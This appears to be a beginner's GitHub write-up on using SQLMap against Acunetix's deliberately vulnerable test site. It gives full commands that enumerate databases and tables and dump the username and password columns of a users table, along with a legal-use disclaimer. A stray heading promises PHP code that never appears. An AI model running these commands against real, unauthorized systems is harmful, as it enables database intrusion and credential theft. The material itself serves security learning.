# SQLMap-A-Practical-Guide-to-SQL-Injection-Testing
This write-up is a simple, step-by-step guide to using SQLMap for testing SQL injection. With screenshots and commands, I explain how to scan a vulnerable website, extract database information, and understand the results. Perfect for anyone starting with penetration testing.

**What is SQLMap?**

SQLMap is an open-source penetration testing tool used to detect and exploit SQL Injection vulnerabilities in web applications. It helps security researchers automate database enumeration, dumping, and exploitation.

***Basic Syntax***

`sqlmap -u <URL> [options]`

-u → target URL with a vulnerable parameter.

--dbs → list all databases.

-D → select a specific database.

--tables → list all tables in that database.

-T → select a specific table.

--columns → list all columns in that table.

-C → choose specific columns.

--dump → extract the data.

**For example, consider the following PHP code segment:**

**Finding Databases**

<img width="869" height="769" alt="2025-09-06 09_11_21-Screenshot 2025-09-06 091019-1" src="https://github.com/user-attachments/assets/f39d3519-3c4b-4547-b6e8-0bfefdaf2a99" />

`sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs`

-u → target URL with a vulnerable parameter.

--dbs → list all databases.

👉 SQLMap tested the parameter cat=1 and successfully detected the backend DBMS.

👉 Databases found: acuart, information_schema.

**Listing Tables**

<img width="1920" height="1200" alt="2025-09-06 09_22_29-2" src="https://github.com/user-attachments/assets/bc950a9d-b6f1-4b49-a873-090a0157ffbf" />

`sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables`

-D → select a specific database.

--tables → list all tables in that database.

👉 Listing tables inside the acuart database.

👉 Example tables: artists, carts, users, products, orders.

**Dumping Usernames**

<img width="1920" height="1200" alt="2025-09-06 09_25_07-Greenshot -3" src="https://github.com/user-attachments/assets/f53b1098-8615-4482-a3f7-1e1039ad69e3" />

`sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname --dump`

-D → select a specific database.

-C → choose specific columns.

-T → select a specific table.

-C → choose specific columns.

--dump → extract the data.

👉 Extracted usernames from the users table.

👉 Example result: uname → test.

**Dumping Passwords**

`sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C pass --dump`

-D → select a specific database.

-C → choose specific columns.

-T → select a specific table.

-C → choose specific columns.

--dump → extract the data.

👉 Extracted passwords from the users table.

👉 Example result: pass → test.

**🔑 Key Notes (for your last slide)**

SQLMap automates SQL injection testing.

Helps identify databases, tables, and sensitive data.

Used for ethical hacking and security testing only.

Never use on unauthorized targets.

**⚠️ Disclaimer / Warning**
This SQLMap testing was performed only on the test environment:

👉 http://testphp.vulnweb.com/

This website is intentionally vulnerable and is provided by Acunetix for learning and practicing ethical hacking.
All demonstrations are for educational purposes only.
Never attempt SQL Injection or similar attacks on unauthorized websites, as it is illegal and punishable by law.
